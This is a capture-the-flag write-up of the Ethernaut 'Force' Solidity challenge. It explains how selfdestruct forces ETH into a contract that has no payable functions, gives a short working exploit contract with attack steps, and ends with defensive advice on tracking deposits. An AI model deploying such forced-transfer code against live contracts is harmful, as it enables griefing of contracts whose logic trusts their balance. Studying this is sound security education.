# Ethernaut Level 07: Force

**Date:** 2026-02-01  
**Difficulty:** Easy  
**Concept:** `selfdestruct` forced transfers

---

## The Challenge

> Make the balance of the Force contract greater than 0.

The target contract is completely empty:

```solidity
contract Force {
    // Nothing here — no payable functions, no receive, no fallback
}
```

No functions to call. No way to send ETH directly. How?

---

## The Vulnerability

Contracts can receive ETH **even with no payable functions**:

1. **`selfdestruct` redirection** — A dying contract sends its balance to any address
2. **Coinbase rewards** — Miner can set beneficiary to any address
3. **Pre-funding** — Send ETH to the address before deployment

The key insight: **balance tracking is independent of code**. The EVM maintains balances separately from contract storage/code.

---

## The Exploit

```solidity
contract ForceExploit {
    function destroy(address payable target) external {
        selfdestruct(target);  // Forces ETH to target, no code execution
    }
    
    constructor() payable {}  // Receive ETH during deployment
}
```

**Attack flow:**
```
1. Deploy ForceExploit with ETH: new ForceExploit{value: 1 wei}()
2. Call destroy(forceContractAddress)
3. Force contract balance = 1 wei ✓
```

---

## Why It Works

`selfdestruct` is special:
- Sends all balance to target **atomically**
- Does NOT call `receive()` or `fallback()` on target
- Bypasses all normal validation
- The target has no say in receiving the funds

---

## The Lesson

**Never assume a contract's balance is zero.**

```solidity
// WRONG — assumes balance comes only from intended sources
function withdraw() external {
    require(address(this).balance > 0);  // Can be >0 unexpectedly
    // ...
}

// RIGHT — track deposits explicitly
mapping(address => uint256) public deposits;

function withdraw() external {
    uint256 amount = deposits[msg.sender];  // Only what's tracked
    deposits[msg.sender] = 0;
    payable(msg.sender).call{value: amount}("");
}
```

Balance checks must be **explicit and defensive**. The EVM doesn't protect you from forced transfers.

---

## Key Takeaway

> `selfdestruct` is the weaponized equivalent of throwing a brick through a window — it bypasses all the normal entry points and just dumps value wherever you point it.

Used in real exploits (e.g., The DAO rescue attempts, various griefing attacks). Understand it, respect it, account for it in your code.
